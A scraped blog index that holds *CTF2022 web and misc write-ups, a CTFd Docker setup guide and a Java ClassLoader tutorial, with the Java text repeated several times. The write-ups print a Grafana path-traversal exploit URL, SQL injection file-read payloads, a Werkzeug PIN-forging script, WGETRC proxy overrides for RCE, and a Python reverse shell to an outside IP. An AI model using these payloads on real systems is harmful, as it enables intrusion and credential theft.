把文件传上去，然后去lotto路由修改WGETRC的值为/app/guess/forecast.txt 然后触发wget命令，拿到flag 但是这个方法不够优雅，会覆盖掉wget，让其他选手没有体验感 ","date":"2022-04-20","objectID":"/ctf2022_oh-my-lotto-revenge/:3:1","series":null,"tags":null,"title":"[*CTF2022] oh-my-lotto-revenge","uri":"/ctf2022_oh-my-lotto-revenge/#0x01"},{"categories":["CTF"],"content":"0x02WGETRC还有一个参数 use_askpass=/bin/xxx 通过这个参数可以直接执行二进制文件，但是wget下载的文件，是没有x权限的，无法执行 所以我们可以通过覆盖掉/bin/sh后（题目使用的是/usr/bin/），再利用这个参数去执行他 所以具体步骤是： 首先上传如下文件，覆盖掉可以执行文件 output_document = /bin/sh http_proxy = test.huamang.xyz https_proxy = test.huamang.xyz 然后上传use_askpass参数去执行命令 use_askpass=/bin/sh 成功RCE ","date":"2022-04-20","objectID":"/ctf2022_oh-my-lotto-revenge/:3:2","series":null,"tags":null,"title":"[*CTF2022] oh-my-lotto-revenge","uri":"/ctf2022_oh-my-lotto-revenge/#0x02"},{"categories":["技术分享"],"content":"前言（使用github图床，请科学上网） 搭建校赛平台，这里是发现有一个很好看的ctfd的主题pixo 所以就想着来搭建这么一个平台，这次我打算使用docker来搭建，使用docker搭建有两条路可走 docker pull ctfd/ctfd docker-compose up ","date":"2022-04-19","objectID":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/:1:0","series":null,"tags":null,"title":"校赛CTFd平台docker搭建—pixo主题","uri":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/#前言"},{"categories":["技术分享"],"content":"第一种方法的尝试首先我是打算直接使用docker pull的方式来搭建的，的确可以搭建，但是主页会有广告 我想着怎么把他删掉，我把文件通过docker传回服务器 docker cp xx:/opt/CTFd ./ 然后下载到本机进行搜索，发现他存在于views.py文件里面 我对这个文件进行了审计，发现他会在setup的时候把内容写进html内，但是这里就有问题了，我如果是pull下来的镜像，我运行的时候他就已经启动了views.py，所以我无法修改里面的广告信息。所以我无奈之下只能放弃这个方法，我开始尝试docker-compose来进行搭建 ","date":"2022-04-19","objectID":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/:2:0","series":null,"tags":null,"title":"校赛CTFd平台docker搭建—pixo主题","uri":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/#第一种方法的尝试"},{"categories":["技术分享"],"content":"docker-compose我从github下载到CTFd3.4.3版本的文件，我找到docker-compose.yml文件，修改了端口号一后，我就开始执行docker-compose up 我观察dockerfile，这里会进行apt的更新和下载 但是发现apt会下载的十分缓慢，等了很久很久都下不完，于是我选择进行换源，我dockerfile进行如下修改，增加如下命令执行 RUN sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list RUN apt-get clean RUN apt-get update 我空了一段时间打开，发现apt已经处理好了，但是pip出问题了，他下载超时了。。 所以我还得对pip进行换源，我又对dockerfile进行如下的修改，添加阿里云源 RUN pip config set global.index-url http://mirrors.aliyun.com/pypi/simple RUN pip config set install.trusted-host mirrors.aliyun.com 看见pip已经把所有模块安装完毕，就当我以为快要成功的时候，发现这里又有报错，说我的80端口被占用，那我不可能因为一个docker就把80端口给让出来吧，所以我修改了docker-compose.yml文件，将Nginx的端口转发到其他的端口 这下总算成功的搭建起来了 ","date":"2022-04-19","objectID":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/:3:0","series":null,"tags":null,"title":"校赛CTFd平台docker搭建—pixo主题","uri":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/#docker-compose"},{"categories":["技术分享"],"content":"END附上这次dockerfile和docker-compose.yml dockerfile FROMpython:3.7-slim-busterWORKDIR/opt/CTFdRUN mkdir -p /opt/CTFd /var/log/CTFd /var/uploads# hadolint ignore=DL3008RUN sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.listRUN apt-get cleanRUN apt-get updateRUN pip config set global.index-url http://mirrors.aliyun.com/pypi/simpleRUN pip config set install.trusted-host mirrors.aliyun.comRUN apt-get update \\ \u0026\u0026 apt-get install -y --no-install-recommends \\ build-essential \\ python3-dev \\ libffi-dev \\ libssl-dev \\ git \\ \u0026\u0026 apt-get clean \\ \u0026\u0026 rm -rf /var/lib/apt/lists/*COPY requirements.txt /opt/CTFd/RUN pip install -r requirements.txt --no-cache-dirCOPY . /opt/CTFd# hadolint ignore=SC2086RUN for d in CTFd/plugins/*; do \\ if [ -f \"$d/requirements.txt\" ]; then \\ pip install -r $d/requirements.txt --no-cache-dir; \\ fi; \\ done;RUN adduser \\ --disabled-login \\ -u 1001 \\ --gecos \"\" \\ --shell /bin/bash \\ ctfdRUN chmod +x /opt/CTFd/docker-entrypoint.sh \\ \u0026\u0026 chown -R 1001:1001 /opt/CTFd /var/log/CTFd /var/uploadsUSER1001EXPOSE8000ENTRYPOINT [\"/opt/CTFd/docker-entrypoint.sh\"] docker-compose.yml version:'2'services:ctfd:build:.user:rootrestart:alwaysports:- \"50010:8000\"environment:- UPLOAD_FOLDER=/var/uploads- DATABASE_URL=mysql+pymysql://ctfd:ctfd@db/ctfd- REDIS_URL=redis://cache:6379- WORKERS=1- LOG_FOLDER=/var/log/CTFd- ACCESS_LOG=-- ERROR_LOG=-- REVERSE_PROXY=truevolumes:- .data/CTFd/logs:/var/log/CTFd- .data/CTFd/uploads:/var/uploads- .:/opt/CTFd:rodepends_on:- dbnetworks:default:internal:nginx:image:nginx:1.17restart:alwaysvolumes:- ./conf/nginx/http.conf:/etc/nginx/nginx.confports:- 50011:80depends_on:- ctfddb:image:mariadb:10.4.12restart:alwaysenvironment:- MYSQL_ROOT_PASSWORD=ctfd- MYSQL_USER=ctfd- MYSQL_PASSWORD=ctfd- MYSQL_DATABASE=ctfdvolumes:- .data/mysql:/var/lib/mysqlnetworks:internal:# This command is required to set important mariadb defaultscommand:[mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=28800, --log-warnings=0]cache:image:redis:4restart:alwaysvolumes:- .data/redis:/datanetworks:internal:networks:default:internal:internal:true ","date":"2022-04-19","objectID":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/:4:0","series":null,"tags":null,"title":"校赛CTFd平台docker搭建—pixo主题","uri":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/#end"},{"categories":["CTF"],"content":"Web","date":"2022-04-17","objectID":"/ctf2022_wp/:1:0","series":null,"tags":null,"title":"[*CTF2022] WP","uri":"/ctf2022_wp/#web"},{"categories":["CTF"],"content":"oh-my-grafana存在CVE-2021-43798 paylaod http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db 有个加盐的密码 再找找其他配置文件，反正任意文件读取用起来 http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/grafana/grafana.ini 拿到了密码 # default admin user, created on startup admin_user = admin # default admin password, can be changed before first start of grafana, or in profile settings admin_password = 5f989714e132c9b04d4807dafeb10ade 进去后可以执行sql语句 查一下表名 拿flag ","date":"2022-04-17","objectID":"/ctf2022_wp/:1:1","series":null,"tags":null,"title":"[*CTF2022] WP","uri":"/ctf2022_wp/#oh-my-grafana"},{"categories":["CTF"],"content":"oh-my-lotto主要思路就是： 首先是随便摸一个奖，然后在result路由里面获得了结果，是上一轮的 正常情况下，你再次去摸奖，他会wget不改变名字的去下载乐透结果，也就等同于更新一次乐透结果，也就是这个代码 os.system('wget --content-disposition -N lotto') 但是在此之前，有这么一句代码 lotto_key = request.form.get('lotto_key') or '' lotto_value = request.form.get('lotto_value') or '' os.environ[lotto_key] = lotto_value 这里我们可以操作lotto_key和lotto_value 那么就可以把path改掉，让他执行不了wget命令，这样的话，/app/lotto_result.txt就和上一局是一样的 这样的话，我们再把上一次的乐透结果传上去，这样就能判断相等，获取flag if os.path.exists(\"/app/guess/forecast.txt\"): forecast = open(\"/app/guess/forecast.txt\", 'rb').read() if forecast == lotto_result: return flag 然后访问lotto路由拿到flag 注意有个坑，乐透结果之间是换行，所以文件构造的也应该是换行 ","date":"2022-04-17","objectID":"/ctf2022_wp/:1:2","series":null,"tags":null,"title":"[*CTF2022] WP","uri":"/ctf2022_wp/#oh-my-lotto"},{"categories":["CTF"],"content":"oh-my-noteadmin:admin进入后台 在view note处存在sql注入，基本没有过滤，而且开启了debug http://124.70.185.87:5002/view?note_id=pt8q0tub5k59zh9b4hc5te6kdc6vjyn3%27 开了debug，需要构造pin码，利用sql注入进行文件读取 payload如下 ';create table fxz1(data text);# 读取mac地址/sys/class/net/eth0/address、/etc/machine-id、/proc/self/cgroup load data 写入创建的表 /etc/machine-id一般固定 1cc402dd0e11d5ae18db04a6de87223d ';LOAD DATA LOCAL INFILE \"/sys/class/net/eth0/address\" INTO TABLE fxz1;# ';LOAD DATA LOCAL INFILE \"/proc/self/cgroup\" INTO TABLE fxz2;# 查看结果 ' union select 1,2,3,4,(select(group_concat(data))from(fxz1))# 构造pin生成脚本 #sha1 import hashlib from itertools import chain probably_public_bits = [ 'ctf'# /etc/passwd 'flask.app',# 默认值 'Flask',# 默认值 '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到 ] private_bits = [ 'xxx',# /sys/class/net/eth0/address 16进制转10进制 'xxxxxx'# /etc/machine-id+/proc/self/cgroup ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) 587-976-623 进去console用python反弹shell，到根目录执行/readflag import os,pty,socket s=socket.socket() s.connect((\"101.35.***\",8866)) [os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\") ","date":"2022-04-17","objectID":"/ctf2022_wp/:1:3","series":null,"tags":null,"title":"[*CTF2022] WP","uri":"/ctf2022_wp/#oh-my-note"},{"categories":["CTF"],"content":"Misc","date":"2022-04-17","objectID":"/ctf2022_wp/:2:0","series":null,"tags":null,"title":"[*CTF2022] WP","uri":"/ctf2022_wp/#misc"},{"categories":["CTF"],"content":"today“I’m anninefour. I love machine learning and data science. Flag is in my pocket!” 名字是anninefour，喜欢机器学习和数据科学，那么可以去各大机器学习平台社区搜搜这个人 在kaggle里面找到了这个人 https://www.kaggle.com/anninefour 绑定了一个推特 到了一个图片 看到对面有一个农夫果品生鲜超市 去高德搜了一下，全称直接搜没搜到，搜一半农夫果品，发现集中在上海，貌似是上海连锁，而且图片能非常相似的对上 在上海区域搜农夫果品生鲜超市，只有一个能完全对应上名字 拍照的小区在对面，叫花山名苑 在google地图评论里找到了flag ","date":"2022-04-17","objectID":"/ctf2022_wp/:2:1","series":null,"tags":null,"title":"[*CTF2022] WP","uri":"/ctf2022_wp/#today"},{"categories":["Java"],"content":"前言借用了先知社区的文章的一张图来解释这个原理 负责动态加载Java类到Java虚拟机的内存空间中，用于加载系统、网络或者其他来源的类文件。Java源代码通过javac编译器编译成类文件，然后JVM来执行类文件中的字节码来执行程序。 ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:0:0","series":null,"tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/#前言"},{"categories":["Java"],"content":"类加载器介绍类加载器大致分为两类： JVM 默认类加载器 用户自定义类加载器 ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:0:0","series":null,"tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/#类加载器介绍"},{"categories":["Java"],"content":"类加载器分类 引导类加载器(BootstrapClassLoader)：属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在/jre/lib/rt.jar目录当中、 扩展类加载器(ExtensionsClassLoader)：sun.misc.Launcher$ExtClassLoader类实现，用来在/jre/lib/ext或者java.ext.dirs中指明的目录加载java的扩展库 系统类加载器(AppClassLoader)：由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它 自定义类加载器(UserDefineClassLoader)：这个就是由用户自定义的类加载器 ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:1:0","series":null,"tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/#类加载器分类"},{"categories":["Java"],"content":"ClassLoader类核心方法除了上述引导类加载器BootstrapClassLoader，其他类加载器都是继承了CLassLoader类 ClassLoader类是一个抽象类，主要的功能是通过指定的类的名称，找到对应的字节码，返回一java.lang.Class类的实例。 loadClass：加载指定的java类加载名称为name的类，返回的结果是java.lang.Class类的实例 可以看loadClass的源码 protected Class\u003c?\u003e loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded Class\u003c?\u003e c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; } } 先进行findLoadedClass进行判断是否加载过这个类，如果已经加载过的话，就直接返回；如果没加载过，则使用加载器的父类的加载器去加载。当没有父类的时候，则会调用自身的findClass方法，因此可以重写findClass方法完成一些类加载的特殊要求 findCLass：查找指定的Java类 protected Class\u003c?\u003e findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); } findLoadedClass：查找JVM已经加载过的类 protected final Class\u003c?\u003e findLoadedClass(String name) { if (!checkName(name)) return null; return findLoadedClass0(name); } defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用 protected final Class\u003c?\u003e defineClass(byte[] b, int off, int len) throws ClassFormatError { return defineClass(null, b, off, len, null); } resolveClass：链接指定Java类 protected final void resolveClass(Class\u003c?\u003e c) { resolveClass0(c); } private native void resolveClass0(Class c); ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:2:0","series":null,"tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/#classloader类核心方法"},{"categories":["Java"],"content":"ClassLoader类核心方法除了上述引导类加载器BootstrapClassLoader，其他类加载器都是继承了CLassLoader类 ClassLoader类是一个抽象类，主要的功能是通过指定的类的名称，找到对应的字节码，返回一java.lang.Class类的实例。 loadClass：加载指定的java类加载名称为name的类，返回的结果是java.lang.Class类的实例 可以看loadClass的源码 protected Class loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded Class c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; } } 先进行findLoadedClass进行判断是否加载过这个类，如果已经加载过的话，就直接返回；如果没加载过，则使用加载器的父类的加载器去加载。当没有父类的时候，则会调用自身的findClass方法，因此可以重写findClass方法完成一些类加载的特殊要求 findCLass：查找指定的Java类 protected Class findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); } findLoadedClass：查找JVM已经加载过的类 protected final Class findLoadedClass(String name) { if (!checkName(name)) return null; return findLoadedClass0(name); } defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用 protected final Class defineClass(byte[] b, int off, int len) throws ClassFormatError { return defineClass(null, b, off, len, null); } resolveClass：链接指定Java类 protected final void resolveClass(Class c) { resolveClass0(c); } private native void resolveClass0(Class c); ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:2:0","series":null,"tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/#loadclass加载指定的java类"},{"categories":["Java"],"content":"ClassLoader类核心方法除了上述引导类加载器BootstrapClassLoader，其他类加载器都是继承了CLassLoader类 ClassLoader类是一个抽象类，主要的功能是通过指定的类的名称，找到对应的字节码，返回一java.lang.Class类的实例。 loadClass：加载指定的java类加载名称为name的类，返回的结果是java.lang.Class类的实例 可以看loadClass的源码 protected Class loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded Class c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; } } 先进行findLoadedClass进行判断是否加载过这个类，如果已经加载过的话，就直接返回；如果没加载过，则使用加载器的父类的加载器去加载。当没有父类的时候，则会调用自身的findClass方法，因此可以重写findClass方法完成一些类加载的特殊要求 findCLass：查找指定的Java类 protected Class findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); } findLoadedClass：查找JVM已经加载过的类 protected final Class findLoadedClass(String name) { if (!checkName(name)) return null; return findLoadedClass0(name); } defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用 protected final Class defineClass(byte[] b, int off, int len) throws ClassFormatError { return defineClass(null, b, off, len, null); } resolveClass：链接指定Java类 protected final void resolveClass(Class c) { resolveClass0(c); } private native void resolveClass0(Class c); ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:2:0","series":null,"tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/#findclass查找指定的java类"},{"categories":["Java"],"content":"ClassLoader类核心方法除了上述引导类加载器BootstrapClassLoader，其他类加载器都是继承了CLassLoader类 ClassLoader类是一个抽象类，主要的功能是通过指定的类的名称，找到对应的字节码，返回一java.lang.Class类的实例。 loadClass：加载指定的java类加载名称为name的类，返回的结果是java.lang.Class类的实例 可以看loadClass的源码 protected Class loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded Class c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; } } 先进行findLoadedClass进行判断是否加载过这个类，如果已经加载过的话，就直接返回；如果没加载过，则使用加载器的父类的加载器去加载。当没有父类的时候，则会调用自身的findClass方法，因此可以重写findClass方法完成一些类加载的特殊要求 findCLass：查找指定的Java类 protected Class findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); } findLoadedClass：查找JVM已经加载过的类 protected final Class findLoadedClass(String name) { if (!checkName(name)) return null; return findLoadedClass0(name); } defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用 protected final Class defineClass(byte[] b, int off, int len) throws ClassFormatError { return defineClass(null, b, off, len, null); } resolveClass：链接指定Java类 protected final void resolveClass(Class c) { resolveClass0(c); } private native void resolveClass0(Class c); ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:2:0","series":null,"tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/#findloadedclass查找jvm已经加载过的类"},{"categories":["Java"],"content":"ClassLoader类核心方法除了上述引导类加载器BootstrapClassLoader，其他类加载器都是继承了CLassLoader类 ClassLoader类是一个抽象类，主要的功能是通过指定的类的名称，找到对应的字节码，返回一java.lang.Class类的实例。 loadClass：加载指定的java类加载名称为name的类，返回的结果是java.lang.Class类的实例 可以看loadClass的源码 protected Class loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded Class c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; } } 先进行findLoadedClass进行判断是否加载过这个类，如果已经加载过的话，就直接返回；如果没加载过，则使用加载器的父类的加载器去加载。当没有父类的时候，则会调用自身的findClass方法，因此可以重写findClass方法完成一些类加载的特殊要求 findCLass：查找指定的Java类 protected Class findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); } findLoadedClass：查找JVM已经加载过的类 protected final Class findLoadedClass(String name) { if (!checkName(name)) return null; return findLoadedClass0(name); } defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用 protected final Class defineClass(byte[] b, int off, int len) throws ClassFormatError { return defineClass(null, b, off, len, null); } resolveClass：链接指定Java类 protected final void resolveClass(Class c) { resolveClass0(c); } private native void resolveClass0(Class c); ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:2:0","series":null,"tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/#defineclass定义一个java类将字节码解析成虚拟机识别的class对象往往和findclass方法配合使用"},{"categories":["Java"],"content":"ClassLoader类核心方法除了上述引导类加载器BootstrapClassLoader，其他类加载器都是继承了CLassLoader类 ClassLoader类是一个抽象类，主要的功能是通过指定的类的名称，找到对应的字节码，返回一java.lang.Class类的实例。 loadClass：加载指定的java类加载名称为name的类，返回的结果是java.lang.Class类的实例 可以看loadClass的源码 protected Class loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded Class c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; } } 先进行findLoadedClass进行判断是否加载过这个类，如果已经加载过的话，就直接返回；如果没加载过，则使用加载器的父类的加载器去加载。当没有父类的时候，则会调用自身的findClass方法，因此可以重写findClass方法完成一些类加载的特殊要求 findCLass：查找指定的Java类 protected Class findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); } findLoadedClass：查找JVM已经加载过的类 protected final Class findLoadedClass(String name) { if (!checkName(name)) return null; return findLoadedClass0(name); } defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用 protected final Class defineClass(byte[] b, int off, int len) throws ClassFormatError { return defineClass(null, b, off, len, null); } resolveClass：链接指定Java类 protected final void resolveClass(Class c) { resolveClass0(c); } private native void resolveClass0(Class c); ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:2:0","series":null,"tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/#resolveclass链接指定java类"},{"categories":["Java"],"content":"自定义的类加载器那么我们如果要自定义类加载器，那么就要进行如下步骤： 继承ClassLoader类 重载fandClass方法 利用defineClass方法将字节码转换成java.lang.class类对象 代码示例 messageTest public class messageTest { public static void main(String[] args){ System.out.println(\"This is the secret!\"); } } 对class文件加密的类 encodeTest import java.io.*; public class encodeTest { public static void main(String[] args) throws IOException { encode( new File(\"../out/production/Classloader/messageTest.class\"), new File(\"../out/production/Classloader/test/messageTest.class\") ); } public static void encode(File src, File out) throws IOException { FileInputStream fin; FileOutputStream fout; fin = new FileInputStream(src); fout = new FileOutputStream(out); int temp = -1; while ((temp = fin.read()) != -1) {// 读取一个字节 fout.write(temp ^ 0xff);// 取反输出 } fin.close(); fout.close(); } } 再写解密类，重写findclass方法 import java.io.ByteArrayOutputStream; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStream; public class decodeTest extends ClassLoader{ private String rootDir; public decodeTest(String rootDir) { this.rootDir = rootDir; } // 解密文件 public byte[] getClassData(String className) throws IOException { String path = rootDir + \"/\" + className.replace('.', '/') + \".class\"; // 将流中的数据转换为字节数组 InputStream is = null; ByteArrayOutputStream baos = new ByteArrayOutputStream(); is = new FileInputStream(path); byte[] buffer = new byte[1024]; int temp = -1; while ((temp = is.read()) != -1) { baos.write(temp ^ 0xff); } return baos.toByteArray(); } @Override // 重写覆盖findClass protected Class\u003c?\u003e findClass(String className) throws ClassNotFoundException { Class\u003c?\u003e c = findLoadedClass(className); if (c != null) { return c; } else { ClassLoader parent = this.getParent(); c = parent.loadClass(className); if (c != null) { System.out.println(\"父类成功加载\"); return c; } else {// 读取文件 转化成字节数组 byte[] classData = new byte[0]; try { classData = getClassData(className); } catch (IOException e) { e.printStackTrace(); } if (classData == null) { throw new ClassNotFoundException(); } else { // 调用defineClass()方法 c = defineClass(className, classData, 0, classData.length); return c; } } } } } 再写测试类 public class loadClassTest { public static void main(String[] args) throws ClassNotFoundException { decodeTest de = new decodeTest(\"/Users/liucheng/Desktop/JavaSec/out/production/Classloader/test/\"); Class\u003c?\u003e a = de.loadClass(\"messageTest\"); System.out.println(a); } } 由于我指定的class文件是加密后的class文件，所以java自带的类加载器就加载不了，这里我们成功用自定义的类加载器去解密加载到了messageTest ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:3:0","series":null,"tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/#自定义的类加载器"},{"categories":["Java"],"content":"URLClassLoaderURLClassLoader是ClassLoader的一个实现，拥有远程服务器上加载类的能力，通过这个URLClassLoader可以实现对一些webshell的远程加载 这里举个例子 我在Tomcat服务器处生成一个执行系统命令的class public class Test { public static void main(String[] args){ 